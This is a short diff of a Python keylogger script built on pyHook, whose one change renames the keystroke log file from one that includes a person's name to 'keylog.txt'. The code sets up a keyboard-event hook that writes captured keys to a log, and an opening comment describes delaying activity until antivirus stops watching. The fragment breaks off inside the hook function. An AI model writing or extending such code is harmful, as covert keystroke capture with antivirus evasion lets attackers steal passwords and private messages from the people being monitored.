@@ -1,6 +1,6 @@
 #the trick is delay until after AV stops watching...
 import pythoncom, pyHook, sys, logging
-LOG_FILENAME = 'DavidSackmary-keylog.txt'
+LOG_FILENAME = 'keylog.txt'
 def OnKeyboardEvent(event):
     logging.basicConfig(filename=LOG_FILENAME,
                         level=logging.DEBUG,
